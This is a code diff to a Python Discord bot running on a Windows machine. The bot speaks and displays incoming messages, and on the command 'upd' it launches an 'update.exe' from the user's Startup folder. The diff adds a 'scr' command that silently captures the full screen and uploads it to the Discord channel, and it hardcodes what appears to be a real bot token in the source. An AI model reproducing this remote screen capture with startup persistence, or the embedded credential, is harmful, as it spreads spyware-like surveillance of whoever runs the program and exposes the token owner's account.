@@ -1,4 +1,5 @@
 
+from PIL import ImageGrab
 import os 
 import discord
 import getpass
@@ -7,16 +8,17 @@ import pyautogui
 from gtts import gTTS 
 from playsound import playsound
 import time
-from dotenv import load_dotenv
 from threading import Thread
+import tkinter as tk
+from tkinter import messagebox
 
 path1 = "C:/users/"
 path2 = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.exe"
 path=(path1 + getpass.getuser() + path2)
 print(str(path))
 
-load_dotenv()
-token = os.getenv("Ethan")
+
+token = "MTIxMzA0NzI0MDU2NzAzNzk1Mw.Gxc2Cw.y3tksqjto3YvCkJ2eYmHh6OiDpq-CuXP_jnS9w"
 timeout = 1
 connection = False
 def wifi_check():
@@ -41,27 +43,39 @@ class MyClient(discord.Client):
     async def on_message(self, message):
 
         if f'{message.content}' == 'upd':
+            
             os.startfile(str(path))
             quit()
-        else:
+        
+        elif f'{message.content}' == 'scr':
+            # Take screenshot
+            im = ImageGrab.grab()
+            im.save('screenshot.png')
+            await message.channel.send(file=discord.File('screenshot.png'))
+            os.remove('screenshot.png')
 
-            def Minimise():
-                pyautogui.hotkey('win', 'd')
+        else:
+            #Check if the message is from the bot itself
+            if message.author == self.user:
+                return          
             def Playsound():
                 #Play the notification and message contents
                 message_content = (f'{message.content}')
                 player = gTTS(text=message_content, lang='en', slow=False) 
                 player.save("msg.mp3") 
                 playsound('C:/announcer/incoming.mp3')
-                playsound('msg.mp3')
-                os.remove("msg.mp3")
+                playsound('./msg.mp3')
+                os.remove("./msg.mp3")
+            
             def Dialog_Box():
                 message_content = (f'{message.content}')
-                pyautogui.alert(message_content, str(message.author.id))
-                pyautogui.hotkey('win', 'd')
+                root = tk.Tk()
+                root.withdraw()  # Hide the root window
+                root.attributes('-topmost', True)  # Always on top
+                messagebox.showinfo(str(message.author.name), message_content)
+                root.destroy()
 
             
-            Minimise()
             t1 = Thread(target=Playsound)
             t2 = Thread(target=Dialog_Box)
             t1.start()
